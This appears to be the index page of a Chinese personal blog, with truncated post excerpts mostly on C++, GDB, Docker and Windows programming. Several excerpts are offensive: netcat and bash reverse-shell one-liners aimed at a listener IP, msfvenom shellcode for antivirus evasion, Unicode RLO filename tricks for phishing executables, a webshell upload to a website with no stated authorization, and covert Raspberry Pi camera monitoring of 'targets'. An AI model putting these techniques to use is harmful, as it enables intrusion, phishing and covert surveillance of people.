依旧用看雪的图来，看雪NB~奥利 ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2020/03/16/C++NamingConvention/" title="C++命名规范">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/88.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="C++命名规范"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/16/C++NamingConvention/" title="C++命名规范">C++命名规范</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-16T13:45:42.000Z" title="发表于 2020-03-16 21:45:42">2020-03-16</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-04T06:03:28.063Z" title="更新于 2021-05-04 14:03:28">2021-05-04</time></span></div><div class="content">前言首先命名要可读，这是所有规则的公理！！！！！尽可能使用描述性的命名, 别心疼空间, 毕竟相比之下让代码易于新读者理解更重要. 不要用只有项目开发者能理解的缩写, 也不要通过砍掉几个字母来缩写单词。本篇作为学习笔记，约束自己
文件命名文件名全部都要小写并且包含下划线(_)
可接受的文件命名示例:

my_useful_class.cc
http_server_logs.h

C++ 文件要以 .cc 结尾, 头文件以 .h 结尾. 专门插入文本的文件则以 .inc 结尾
通常应尽量让文件名更加明确. http_server_logs.h 就比 logs.h 要好
类型命名类型名称的每个单词首字母均大写, 不包含下划线: MyExcitingClass, MyExcitingEnum.
变量命名
普通变量命名
单词全小写并且用下划线(_)隔开，和文件命名类似，必须要让命名可读，并且明确。
12string table_name;string user_name_read;
类数据成员
再普通的变量名前面加上c_作为开头
123456class TableInfo &#123;  ... ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2020/03/07/Basics/" title="恶意程序研究之免杀基础">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="恶意程序研究之免杀基础"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/07/Basics/" title="恶意程序研究之免杀基础">恶意程序研究之免杀基础</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-07T13:45:42.000Z" title="发表于 2020-03-07 21:45:42">2020-03-07</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:32:35.016Z" title="更新于 2021-05-17 08:32:35">2021-05-17</time></span></div><div class="content">
声明

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
前言踩着大佬们的脚步，用自己蹩脚的C++功底复现了师傅给出的一些免杀方案。后续将给出自己的两个免杀方案，复现大佬们的这几个方案用了3天时间，我真的是菜的可怜。


生成ShellCode的方法
使用msfvenom生成的ShellCode

使用参数说明
123456789101112131415-l, --list            &lt;type&gt;     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all-p, --payload         &lt;payload&gt;  要使用的有效载荷-f, --format          &lt;format&gt;   输出格式,输出的语言类型-e, --encoder         &lt;encoder&gt;  ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2019/12/21/raspberry_monitor_0x01/" title="利用树莓派来监听任务目标(上)">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/33.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="利用树莓派来监听任务目标(上)"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/12/21/raspberry_monitor_0x01/" title="利用树莓派来监听任务目标(上)">利用树莓派来监听任务目标(上)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-12-21T04:57:46.000Z" title="发表于 2019-12-21 12:57:46">2019-12-21</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:32:35.016Z" title="更新于 2021-05-17 08:32:35">2021-05-17</time></span></div><div class="content">严正声明：本文仅用于技术探讨，严禁用于其他非法途径。

前言

“黑客”注重的是隐蔽高效的攻陷目标，那么前期的信息收集，以及踩点就是非常重要的了，如何使用树莓派来”监控”目标对象？
当你想知道某个地方的他在做什么？想要知道家里面是否进了小偷？
家里的那个她是否给你带了绿帽子？（写到这里我哭了出来，为什么我没有女朋友！哇~）



硬件清单


读卡器以及 SD 卡
摄像头一枚
SSH连接工具
域名一个
带公网服务器一台
电源(实际场景需要装个充电宝或者使用定制的电源)
监听模块(如果想要带上声音可以装个)

成品图是这样的


刷系统以及换源之类的可以看我另一篇文章，这里就不做其他概述了！

开启摄像头模块

进入配置中
1sudo raspi-config

选择Interfacing Options

接着选择Camera

然后他问会问你是否同意使用pi camera，选择是重启就好了
重启后查看监控模块是否开启了，如何和乡土一样就表示没问题了
1ls -al /dev/ | grep video


简单的测试下是否启动成功，由于我装了夜视模块所以是偏紫色
1raspistil ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2019/12/08/GDB/" title="GDB详细使用介绍">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/32.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GDB详细使用介绍"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/12/08/GDB/" title="GDB详细使用介绍">GDB详细使用介绍</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-12-08T15:59:59.000Z" title="发表于 2019-12-08 23:59:59">2019-12-08</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-04T06:03:28.417Z" title="更新于 2021-05-04 14:03:28">2021-05-04</time></span></div><div class="content">使用GDB启动123SH$ gdb program           # program是你的可执行文件，一般在当前目录$ gdb program core      # gdb同时调试运行程序和core文件，core是程序非法执行产生的文件$ gdb program pid       # 如果你的程序是一个服务程序，那么你可以指定这个服务程序运行时的进程ID。gdb会自动attach上去，并调试他。program应该在PATH环境变量中搜索得到。

运行123456789101112131415161718SH(gdb) r/run             # 开始运行程序(gdb) c/continue        # 继续运行(gdb) n/next            # 下一行，不进入函数调用(gdb) s/step            # 下一行，进入函数调用(gdb) ni/si             # 吓一跳指令，ni和si区别同上(gdb) fini/finish       # 继续运行至函数退出/当前栈帧(gdb) u/util            ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2019/12/03/C++Regular/" title="C++正则规则">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/30.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="C++正则规则"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/12/03/C++Regular/" title="C++正则规则">C++正则规则</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-12-03T15:58:53.000Z" title="发表于 2019-12-03 23:58:53">2019-12-03</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-04T06:03:28.417Z" title="更新于 2021-05-04 14:03:28">2021-05-04</time></span></div><div class="content">常用的元字符：
.： 匹配除\n之外的任何单个字符，若要匹配包括\n在内的任意字符，需使用诸如[\s\S]之类的模式；
^：匹配输入字符串的开始位置，不匹配任何字符，要匹配^字符本身，需使用\^；
$：匹配输入字符串结尾的位置，不匹配任何字符，要匹配$字符本身，需使用\$；
*： 零次或多次匹配前面的字符或子表达式，*等效于&#123;0,&#125;，如\^*b可以匹配b、^b、^^b、…；
+： 一次或多次匹配前面的字符或子表达式，等效于&#123;1,&#125;，如a+b可以匹配ab、aab、aaab、…；
?： 零次或一次匹配前面的字符或子表达式，等效于&#123;0,1&#125;，如a[cd]?可以匹配a、ac、ad； 当此字符紧随任何其他限定符*、+、?、&#123;n&#125;、&#123;n,&#125;、&#123;n,m&#125;之后时，匹配模式是非贪心的。非贪心的模式匹配搜索到的、尽可能短的字符串，而默认的贪心的模式匹配搜索到的、尽可能长的字符串。如，在字符串oooo中，o+?只匹配单个o，而o+匹配所有o；
|：将两个匹配条件进行逻辑或(Or)运算,如正 ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2019/11/21/TheDifferenceBetweenC++NewAndMalloc/" title="c++ new和malloc的区别">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/99.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="c++ new和malloc的区别"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/11/21/TheDifferenceBetweenC++NewAndMalloc/" title="c++ new和malloc的区别">c++ new和malloc的区别</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-11-21T13:45:12.000Z" title="发表于 2019-11-21 21:45:12">2019-11-21</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:31:53.721Z" title="更新于 2021-05-17 08:31:53">2021-05-17</time></span></div><div class="content">1. 申请的内存所在位置new操作符从自由存储区（free store）上为对象动态分配内存空间，而malloc函数从堆上动态分配内存。自由存储区是C++基于new操作符的一个抽象概念，凡是通过new操作符进行内存申请，该内存即为自由存储区。而堆是操作系统中的术语，是操作系统所维护的一块特殊内存，用于程序的内存动态分配，C语言使用malloc从堆上分配内存，使用free释放已分配的对应内存。
那么自由存储区是否能够是堆（问题等价于new是否能在堆上动态分配内存），这取决于operator new 的实现细节。自由存储区不仅可以是堆，还可以是静态存储区，这都看operator new在哪里为对象分配内存。
特别的，new甚至可以不为对象分配内存！定位new的功能可以办到这一点：
1new (place_address) type

place_address为一个指针，代表一块内存的地址。当使用上面这种仅以一个地址调用new操作符时，new操作符调用特殊的operator new，也就是下面这个版本：
1void * operator new (size_t,void *) &#x2F; ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2019/11/14/C++GetInstalledProgramNotes/" title="C++ 获取已安装程序笔记">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/28.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="C++ 获取已安装程序笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/11/14/C++GetInstalledProgramNotes/" title="C++ 获取已安装程序笔记">C++ 获取已安装程序笔记</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-11-14T13:45:12.000Z" title="发表于 2019-11-14 21:45:12">2019-11-14</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-04T06:03:28.063Z" title="更新于 2021-05-04 14:03:28">2021-05-04</time></span></div><div class="content">在Windows系统中，已安装软件的信息都保存在注册表中
那种绿色免安装包还不知道怎么获取
32位系统存在以下两个位置：
12HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\UninstallHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

64位系统在32位系统上多出一处，也就是WOW6432Node的节点下
1HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall

如何区分哪个是补丁哪个是安装程序
1231.如果注册表项下面有&quot;SystemComponent&quot;字段并且值等于1时，表示这是个系统组件，而不是应用软件。2.如果注册表项下面有&quot;ParentKeyName&quot;字段则表示该项是某个分类下的子项，一般情况补丁才会有&quot;ParentKeyName&quot;字段 ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2019/11/13/typedef/" title="C++ Typedef用法">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/20.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="C++ Typedef用法"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/11/13/typedef/" title="C++ Typedef用法">C++ Typedef用法</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-11-13T13:45:12.000Z" title="发表于 2019-11-13 21:45:12">2019-11-13</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-04T06:03:28.063Z" title="更新于 2021-05-04 14:03:28">2021-05-04</time></span></div><div class="content">C++ Typedef用法用途一：
定义一种类型的别名，而不只是简单的宏替换。可以用作同时声明指针型的多个对象。比如：
1char* pa, pb; // 这多数不符合我们的意图，它只声明了一个指向字符变量的指针， 和一个字符变量；

以下则可行：
123typedef char* PCHAR;PCHAR pa, pb; 

这种用法很有用，特别是char* pa, pb的定义，初学者往往认为是定义了两个字符型指针，其实不是，而用typedef char* PCHAR就不会出现这样的问题，减少了错误的发生。
用途二:用在旧的C代码中，帮助struct。以前的代码中，声明struct新对象时，必须要带上struct，即形式为： struct 结构名对象名，如：
12345struct tagPOINT1 &#123;    int x;    int y; &#125;;struct tagPOINT1 p1;

而在C++中，则可以直接写：结构名对象名，即：tagPOINT1 p1;
12345678typedef struct tagPOINT&#123;    int x;     ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2019/11/13/C++WMIToObtainHardwareInformation/" title="C++ WMI获取硬件信息笔记">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/21.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="C++ WMI获取硬件信息笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/11/13/C++WMIToObtainHardwareInformation/" title="C++ WMI获取硬件信息笔记">C++ WMI获取硬件信息笔记</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-11-13T13:45:12.000Z" title="发表于 2019-11-13 21:45:12">2019-11-13</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-04T06:03:28.063Z" title="更新于 2021-05-04 14:03:28">2021-05-04</time></span></div><div class="content">获取已更新补丁部分示例代码如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151int CWindowsLeak::GetInstalledPatch(std::map&lt;std::string, tagLeak&gt;  &amp; aVector)&#123;		HRESULT hRet = S_OK;		IWbemLocator *pIWbemLo ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2019/10/12/LinuxInstallJavaEnvironment/" title="Linux安装java环境">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/12.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux安装java环境"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/10/12/LinuxInstallJavaEnvironment/" title="Linux安装java环境">Linux安装java环境</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-10-11T16:00:00.000Z" title="发表于 2019-10-12 00:00:00">2019-10-12</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-04T06:03:28.065Z" title="更新于 2021-05-04 14:03:28">2021-05-04</time></span></div><div class="content">通用系统安装
下载完成后解压到指定文件下

12先创建java文件目录，如果已存在就不用创建mkdir -p &#x2F;usr&#x2F;local&#x2F;java


解压到java文件目录

1tar -vzxf jdk-8u161-linux-x64.tar.gz -C &#x2F;usr&#x2F;local&#x2F;java&#x2F;


添加环境变量，编辑配置文件

1vi &#x2F;etc&#x2F;profile


在文件最下方或者指定文件添加

123export JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_161export CLASSPATH&#x3D;$:CLASSPATH:$JAVA_HOME&#x2F;lib&#x2F;export PATH&#x3D;$PATH:$JAVA_HOME&#x2F;bin


保存退出

1source &#x2F;etc&#x2F;profile


最后测试

1java -version


可以看到一下信息则表示配置成功

123 ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2019/08/19/NetcatReboundShell/" title="Netcat反弹Shell详解">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/29.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Netcat反弹Shell详解"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/08/19/NetcatReboundShell/" title="Netcat反弹Shell详解">Netcat反弹Shell详解</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-08-19T14:51:42.000Z" title="发表于 2019-08-19 22:51:42">2019-08-19</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-04T06:03:28.063Z" title="更新于 2021-05-04 14:03:28">2021-05-04</time></span></div><div class="content">Windows
进入下载地址下载文件https://eternallybored.org/misc/netcat/
将文件夹中的对应可执行文件复制到C:\Windows\System32的文件夹下(有32位版和64位版)
直接打开cmd输入nc XXXXXX执行就好

Linux
直接使用nc命令就好

自己常用的命令
Windows

1nc -e cmd.exe -d IP port(靶机)


Linux

123nc -lvvp 8080(监听机)  监听8080端口nc IP Port (受害者机)   IP为监听机的IP 端口为监听机开的端口bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;3.16.30.73&#x2F;1231 0&gt;&amp;1(受害者机)


主要参数123456789101112131415161718192021222324252627282930313233343536#无命令行界面,使用后台模式-d#程序重定向 -e#源路由跳跃点, 不超过8-g#源路由指示器: 4, 8, 12, ...-G       ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2019/08/15/Docker/" title="Docker笔记">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/24.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Docker笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/08/15/Docker/" title="Docker笔记">Docker笔记</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-08-15T13:01:07.000Z" title="发表于 2019-08-15 21:01:07">2019-08-15</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-04T06:03:28.063Z" title="更新于 2021-05-04 14:03:28">2021-05-04</time></span></div><div class="content">安装docker1sudo apt install docker.io

问题解决0x01 运行docker-compose 命令报错解决办法1-bash: docker-compose: command not found


安装

1先安装 pip ，检查是否已有： pip -V 


报错

1-bash: pip: command not found


安装 pip 

12sudo apt-get install epel-releasesudo apt-get install python-pip


升级

1pip install --upgrade pip


安装Docker-Compose

1pip install docker-compose


检查是是否成功

1docker-compose -version

0x02 使用docker-compose报错找不到 ssl_match_hostname解决办法
进入backports模块路径

1cd &#x2F;usr&#x2F;local&#x2F;lib&#x2F;python2.7&#x2F;d ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2019/05/26/ReleaseExeResourceFiles/" title="如何释放存在EXE上的资源文件">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/26.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="如何释放存在EXE上的资源文件"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/05/26/ReleaseExeResourceFiles/" title="如何释放存在EXE上的资源文件">如何释放存在EXE上的资源文件</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-05-26T04:33:42.000Z" title="发表于 2019-05-26 12:33:42">2019-05-26</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:31:53.389Z" title="更新于 2021-05-17 08:31:53">2021-05-17</time></span></div><div class="content">添加资源到项目中直接参考图片就行
生成EXE文件下载ResourceHacker程序把程序导入ResourceHacker中
使用FindResource函数提取PE资源类型为SETIMG
123LPCWSTR b &#x3D; _T(&quot;SETIMG&quot;);HMODULE hLocalHostModule &#x3D; GetModuleHandleA(NULL);HRSRC hRsrc &#x3D; FindResource(hLocalHostModule, (LPCTSTR)106, b);


</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2019/04/25/WindowsAPI/" title="Windows API函数">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows API函数"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/04/25/WindowsAPI/" title="Windows API函数">Windows API函数</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-04-25T09:36:42.000Z" title="发表于 2019-04-25 17:36:42">2019-04-25</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-04T06:03:28.063Z" title="更新于 2021-05-04 14:03:28">2021-05-04</time></span></div><div class="content">1. API之网络函数
WNetAddConnection 创建同一个网络资源的永久性连接
WNetAddConnection2 创建同一个网络资源的连接
WNetAddConnection3 创建同一个网络资源的连接
WNetCancelConnection 结束一个网络连接
WNetCancelConnection2 结束一个网络连接
WNetCloseEnum 结束一次枚举操作
WNetConnectionDialog 启动一个标准对话框，以便建立同网络资源的连接
WNetDisconnectDialog 启动一个标准对话框，以便断开同网络资源的连接
WNetEnumResource 枚举网络资源
WNetGetConnection 获取本地或已连接的一个资源的网络名称
WNetGetLastError 获取网络错误的扩展错误信息
WNetGetUniversalName 获取网络中一个文件的远程名称以及/或者UNC（统一命名规范）名称
WNetGetUser 获取一个网络资源用以连接的名字
WNetOpenEnum 启动对网络资源进行枚举的过程
2. API之消息函数
Broa ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2019/04/05/C++This/" title="C++this">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/25.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="C++this"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/04/05/C++This/" title="C++this">C++this</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-04-05T06:36:42.000Z" title="发表于 2019-04-05 14:36:42">2019-04-05</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-04T06:03:28.416Z" title="更新于 2021-05-04 14:03:28">2021-05-04</time></span></div><div class="content">1.关于this指针的一个经典回答:1234567当你进入一个房子后,你可以看见桌子、椅子、地板等，　　但是房子你是看不到全貌了。　　对于一个类的实例来说，　　你可以看到它的成员函数、成员变量，　　但是实例本身呢？　　this是一个指针，它时时刻刻指向你这个实例本身



3.-&gt;符号123456789101112131415161718#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;class C&#123;	public:	int num;	string name;&#125;;int main(void)&#123;	C obj;	C *p = &amp;obj;	p-&gt;num = 5;	p-&gt;name = &quot;Tony&quot;;	cout &lt;&lt; p-&gt;num &lt;&lt; p-&gt;name &lt;&lt; endl;	return 0;&#125;


程序输出：
15Tony

总结：
      this->c 表示C这个实例本身 ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2019/03/30/GoogleHack/" title="GoogleHack">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/15.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GoogleHack"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/03/30/GoogleHack/" title="GoogleHack">GoogleHack</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-03-30T04:36:42.000Z" title="发表于 2019-03-30 12:36:42">2019-03-30</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:32:35.016Z" title="更新于 2021-05-17 08:32:35">2021-05-17</time></span></div><div class="content">Google Hacking
前言：

这篇文章就是Google Hacking的语句。来自于偶然遇到的一个国外博客，觉得挺不错的，所以分享给大家，文后会附上地址的。自己看图，不多说。
开始：
 

  
 
   
   
  
    
   &nbsp;
&nbsp;
&nbsp;
&nbsp;

 
   
 
 
  
 

  
  
 
  
  
    
    
   
     
     
    
      
     
原文地址：http://highsec.es/2013/09/google-hacking-ejemplos-practicos-parte-i/
allinanchor:
anchor是一处说明性的文字，它标注说明了这个链接可能跳转到其它的网页或跳转到当前网页的不同地方。当我们用allinanchor提交查询的时候，Google会限制搜索结果必须是那些在anchor文字里包含了我们所有查询关键词的网页。例[ allinanchor: best museums Sydney ] ,提交这个查询，Google仅仅会返回在网页anchor说明文 ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2019/02/10/MakingPhishingDocumentsUsingUnicode/" title="利用Unicode实现钓鱼文件制作">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/17.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="利用Unicode实现钓鱼文件制作"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/02/10/MakingPhishingDocumentsUsingUnicode/" title="利用Unicode实现钓鱼文件制作">利用Unicode实现钓鱼文件制作</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-02-10T02:31:40.000Z" title="发表于 2019-02-10 10:31:40">2019-02-10</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:31:53.389Z" title="更新于 2021-05-17 08:31:53">2021-05-17</time></span></div><div class="content">关于UnicodeUnicode（统一码、万国码、单一码）是计算机科学领域里的一项业界标准，包括字符集、编码方案等。Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。
简单来说，它是一种编码格式，满足了以前ASCII码无法表示中文、日文等其他语言的缺陷，但是由此引发的安全问题也很多，比如我们今天介绍的Unicode控制符反转伪装后缀名漏洞。
实现方法替换图标就是把exe的图标替换成图片的默认图标，或者插入一些羞羞的图片或者QQ图标之类的。
插入控制符右键选择重命名，删除原文件名，再右键单击，选择“插入Unicode控制符”，选择RLO

构建文件名需要用两部来制作

gpj.exe
Ascotb

效果如下图

</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2019/02/03/MSSQLPenetrationTest_0x02/" title="MSSQL渗透测试过程(下)">     <img class="post_bg" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/47.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MSSQL渗透测试过程(下)"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/02/03/MSSQLPenetrationTest_0x02/" title="MSSQL渗透测试过程(下)">MSSQL渗透测试过程(下)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-02-03T07:36:42.000Z" title="发表于 2019-02-03 15:36:42">2019-02-03</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-17T00:32:35.016Z" title="更新于 2021-05-17 08:32:35">2021-05-17</time></span></div><div class="content">在这个网址中发现一个上传点才有了本篇博客
 
发现是用ASHX作为后台
但是上传ASP文件访问后直接404
 
接着尝试了ashx
 
看到这个就表示文件调用的asp.net来访问这个文件
后面尝试多次发现无法调用自己上传的ASHX生成ASP一句话
接着尝试了ASPX发现文件可以用但是不管怎么在中间插入一句话都没用，因为上传点把文件直接转码为BASE64
 
 
 
尝试多次还是没办法
下面是大佬教的方法在作者中加入一句话
 
然后在这里修改后缀
 
 

接着菜刀连接
  
Getshell收工
